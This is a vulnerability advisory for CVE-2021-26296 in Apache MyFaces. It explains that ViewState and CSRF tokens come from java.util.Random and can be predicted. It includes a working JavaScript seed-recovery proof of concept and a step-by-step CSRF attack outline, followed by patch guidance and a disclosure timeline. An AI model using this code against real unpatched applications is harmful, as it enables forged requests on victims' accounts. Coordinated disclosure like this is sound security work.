@@ -1,0 +1,232 @@
+id: 35846
+date: 02/20/2021
+title: Apache MyFaces 2.x Cross Site Request Forgery Vulnerability
+author: Wolfgang Ettlinger
+cves: CVE-2021-26296
+
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+ PRODUCT          : Apache MyFaces
+ VENDOR           : The Apache Software Foundation
+ SEVERITY         : High
+ AFFECTED VERSION : <=2.2.13, <=2.3.7, <=2.3-next-M4, <=2.1 branches
+ IDENTIFIERS      : CVE-2021-26296
+ PATCH VERSION    : 2.2.14, 2.3.8, 2.3-next-M5, 3.0.0
+ FOUND BY         : Wolfgang Ettlinger, Certitude Lab
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Introduction
+------------
+
+Apache MyFaces is an open-source implementation of JSF. During a quick
+evaluation, Certitude found that the default CSRF protection of Apache MyFaces
+was insufficient as the CSRF tokens the framework generates can be guessed by
+an attacker.
+
+Moreover, the patch provided by the Apache MyFaces maintainers affects the way
+channel tokens for websocket communication are generated. It is unclear,
+whether this change fixes a vulnerability.
+
+Vulnerability Overview
+----------------------
+
+Applications that employ the MyFaces JSF framework transmit a parameter
+"javax.faces.ViewState" with every state-modifying request. Though not
+intended for CSRF protection, in the default configuration this parameter
+prevents trivial attacks, as it is sufficiently long and tied to a single
+session.
+
+However, by default, this value is generated using the insecure random number
+generator `java.util.Random`. An attacker can therefore obtain a ViewState
+parameter from the application and, based on this value, predict the random
+part of ViewState parameters subsequently issued to other users. Besides the
+random string, the ViewState parameter contains a sequence number. As the
+initial value of the per-session sequence counter is 1, an attacker can very
+easily guess this value.
+
+As the ViewState parameter is the sole CSRF protection, knowledge of this
+value allows an attacker to conduct CSRF attacks.
+
+When Apache MyFaces is used in client-side saving mode, the ViewState
+parameter is insufficient to protect against CSRF. Instead, pages that require
+protection against CSRF can be marked as "protected-pages". For these pages,
+Apache MyFaces requires CSRF token for each request ("javax.faces.Token"). By
+default, the CSRF token too is generated using `java.util.Random`, thus
+allowing an attacker to bypass the CSRF protection.
+
+NOTE: Besides the ViewState parameter and the CSRF token, Apache MyFaces also
+introduced a cryptographically secure random number generator for the
+websocket channel token. Certitude has not verified if this change fixes a
+vulnerability.
+
+Proof of Concept
+----------------
+
+By default, the class
+`org.apache.myfaces.application.viewstate.RandomKeyFactory` is used to
+generate ViewState parameter values. This class uses the method
+`java.util.Random#nextBytes` as well as a per-session counter value to
+generate ViewState strings.
+
+The following JavaScript snippet demonstrates the generation of the random
+part of a ViewState value based on the random part of a previously issued
+ViewState parameter:
+
+``` {.javascript}
+const multiplier = 0x5DEECE66Dn;
+const addend = 0xBn;
+const mask = (1n << 48n) - 1n;
+
+const unbyte = (bytes, offset) => BigInt(
+    Array.from(bytes.slice(offset, offset + 4))
+    .map((b, i) => b << (8 * i))
+    .reduce((a, b) => a + b));
+
+const longify = n => integer(n, 8n);
+const intify = n => integer(n, 4n);
+const byteify = n => integer(n, 1n);
+
+function integer(n, len) {
+    const bits = len * 8n;
+    const hspan = 1n << (bits - 1n);
+    return ((n + hspan) % (2n * hspan)) - hspan;
+}
+
+const hexToByteArray = s => (new Uint8Array(s.length / 2)
+    .map((_, i) => (
+        parseInt(s.charAt(2 * i), 16) << 4 |
+        parseInt(s.charAt(2 * i + 1), 16))));
+
+const byteArrayToHex = b => (Array.from(b)
+    .map(x => (((x + 0x100).toString(16)).substr(-2)))
+    .reduce((a, b) => a + b))
+    .toUpperCase();
+
+// based on https://github.com/fta2012/ReplicatedRandom/blob/master/ReplicatedRandom.java
+function replicatedRandom(bytes) {
+    let seed = 0;
+
+    replicateState(
+        unbyte(bytes, bytes.length - 8), 32n,
+        unbyte(bytes, bytes.length - 4), 32n);
+
+    return nextBytes(bytes.length);
+
+    function replicateState(nextN, n, nextM, m) {
+        const upperMOf48Mask = ((1n << m) - 1n) << (48n - m);
+        const oldSeedUpperN = (nextN << (48n - n)) & mask;
+        const newSeedUpperM = (nextM << (48n - m)) & mask;
+
+        let possibilityCount = 0;
+
+        for (let oldSeed = oldSeedUpperN;
+                oldSeed <= (oldSeedUpperN | ((1n << (48n - n)) - 1n));
+                oldSeed++) {
+            const newSeed = longify(
+                longify(oldSeed * multiplier + addend) & mask);
+
+            if ((newSeed & upperMOf48Mask) == newSeedUpperM) {
+                possibilityCount++;
+                seed = newSeed;
+            }
+        }
+
+        if (possibilityCount != 1) throw new Error('replicateState failed');
+    }
+
+    function next(bits) {
+        seed = longify(longify(seed * multiplier + addend) & mask);
+        return intify(seed >> (48n - bits));
+    }
+
+    function nextBytes(count) {
+        const res = new Int8Array(count);
+
+        for (let i = 0; i < count; ) {
+            let rnd = next(32n);
+            for (let n = Math.min(count - i, 4); n > 0; n--) {
+                res[i++] = parseInt(byteify(rnd));
+                rnd >>= 8n;
+            }
+        }
+
+        return res;
+    }
+}
+```
+
+An attacker can exploit this issue as follows:
+
+1.  An attacker lures an authenticated victim to an attacker-controlled
+    website.
+2.  As the victim opens the website, the attacker requests a ViewState value
+    from the application.
+3.  The exploit script opens the target JSF page e.g. in an iframe. For this
+    page, the vulnerable application generates a new random ViewState value.
+4.  The attacker now predicts a number of the random strings based on the
+    ViewState value received in step 2. As the victim's ViewState value is
+    generated just after the attacker's ViewState value, it is very likely,
+    that the victim's ViewState value is among the generated ones.
+5.  The exploit script sends several CSRF requests containing combinations of
+    predicted random strings and sequence numbers. If guessed correctly, the
+    vulnerable application accepts the attacker's request.
+
+A similar approach is possible to attack protected pages. Unlike the ViewState
+values, the CSRF token generated, however, do not contain a sequence counter.
+
+Resolution
+----------
+
+The Apache MyFaces maintainers have released a patch that addresses the
+identified issue. Certitude recommends affected organizations to immediately
+upgrade to version 2.2.14, 2.3.8, 2.3-next-M5 or 3.0.0. If an upgrade to the
+latest version is not possible, the Apache MyFaces maintainers recommend
+setting the following settings to "secureRandom":
+
+-   org.apache.myfaces.RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN
+-   org.apache.myfaces.RANDOM_KEY_IN_CSRF_SESSION_TOKEN
+-   org.apache.myfaces.RANDOM_KEY_IN_WEBSOCKET_SESSION_TOKEN
+
+Note that the patch introduces changes in the way websocket channel tokens are
+generated. Certitude therefore recommends applying the patch or workaround to
+all applications that use Apache MyFaces, even if CSRF attacks are of no
+concern.
+
+Timeline
+--------
+
+  ---------------------------------------------------------------------------
+  Date         Text
+  ------------ --------------------------------------------------------------
+  2020-12-15   Sending encrypted vulnerability description and proof of
+               concept script to the Apache security team
+
+  2020-12-15   Apache security team acknowledges receipt
+
+  2020-12-28   Apache MyFaces team member requests proof of concept script
+
+  2021-01-04   Asking for encrypted communication channel
+
+  2021-01-04   Vendor provides PGP key
+
+  2021-01-05   Sending encrypted proof of concept
+
+  2021-01-07   Vendor requests more information about the PoC
+
+  2021-01-08   Providing requested information
+
+  2021-01-19   Coordination call with vendor
+
+  2021-01-26   Coordination call with vendor
+
+  2021-02-02   Coordination call with vendor, release of patches is imminent
+
+  2021-02-09   Coordination call with vendor, 3 of 4 patches have been
+               released
+
+  2021-02-15   Coordination call with vendor, last patch release is in
+               progress
+
+  2021-02-19   Public release of the advisory
+  ---------------------------------------------------------------------------
+
+#  0day.today [2023-03-24]  #
